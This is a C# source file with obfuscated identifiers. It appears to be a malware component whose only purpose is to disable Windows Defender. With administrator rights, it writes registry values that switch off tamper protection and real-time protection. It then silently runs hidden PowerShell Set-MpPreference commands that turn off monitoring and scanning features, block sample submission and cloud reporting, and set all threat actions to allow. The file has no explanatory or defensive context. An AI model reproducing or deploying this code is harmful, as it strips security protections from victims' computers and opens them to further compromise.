using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;

namespace MufMaOSvGyvz;

public static class QLRuRgFESyg
{
	public static void PXPqDNdvjDrC()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			EMcqPPGfGFVx("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
			EMcqPPGfGFVx("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
			EMcqPPGfGFVx("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
			EMcqPPGfGFVx("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
			EMcqPPGfGFVx("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
			PdnmizvzKFUCL();
		}
	}

	private static void EMcqPPGfGFVx(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void PdnmizvzKFUCL()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = "Get-MpPreference -verbose",
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith("DisableRealtimeMonitoring") && text.EndsWith("False"))
			{
				tMApihKJxn("Set-MpPreference -DisableRealtimeMonitoring $true");
			}
			else if (text.StartsWith("DisableBehaviorMonitoring") && text.EndsWith("False"))
			{
				tMApihKJxn("Set-MpPreference -DisableBehaviorMonitoring $true");
			}
			else if (text.StartsWith("DisableBlockAtFirstSeen") && text.EndsWith("False"))
			{
				tMApihKJxn("Set-MpPreference -DisableBlockAtFirstSeen $true");
			}
			else if (text.StartsWith("DisableIOAVProtection") && text.EndsWith("False"))
			{
				tMApihKJxn("Set-MpPreference -DisableIOAVProtection $true");
			}
			else if (text.StartsWith("DisablePrivacyMode") && text.EndsWith("False"))
			{
				tMApihKJxn("Set-MpPreference -DisablePrivacyMode $true");
			}
			else if (text.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && text.EndsWith("False"))
			{
				tMApihKJxn("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
			}
			else if (text.StartsWith("DisableArchiveScanning") && text.EndsWith("False"))
			{
				tMApihKJxn("Set-MpPreference -DisableArchiveScanning $true");
			}
			else if (text.StartsWith("DisableIntrusionPreventionSystem") && text.EndsWith("False"))
			{
				tMApihKJxn("Set-MpPreference -DisableIntrusionPreventionSystem $true");
			}
			else if (text.StartsWith("DisableScriptScanning") && text.EndsWith("False"))
			{
				tMApihKJxn("Set-MpPreference -DisableScriptScanning $true");
			}
			else if (text.StartsWith("SubmitSamplesConsent") && !text.EndsWith("2"))
			{
				tMApihKJxn("Set-MpPreference -SubmitSamplesConsent 2");
			}
			else if (text.StartsWith("MAPSReporting") && !text.EndsWith("0"))
			{
				tMApihKJxn("Set-MpPreference -MAPSReporting 0");
			}
			else if (text.StartsWith("HighThreatDefaultAction") && !text.EndsWith("6"))
			{
				tMApihKJxn("Set-MpPreference -HighThreatDefaultAction 6 -Force");
			}
			else if (text.StartsWith("ModerateThreatDefaultAction") && !text.EndsWith("6"))
			{
				tMApihKJxn("Set-MpPreference -ModerateThreatDefaultAction 6");
			}
			else if (text.StartsWith("LowThreatDefaultAction") && !text.EndsWith("6"))
			{
				tMApihKJxn("Set-MpPreference -LowThreatDefaultAction 6");
			}
			else if (text.StartsWith("SevereThreatDefaultAction") && !text.EndsWith("6"))
			{
				tMApihKJxn("Set-MpPreference -SevereThreatDefaultAction 6");
			}
		}
	}

	public static void tMApihKJxn(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}
}
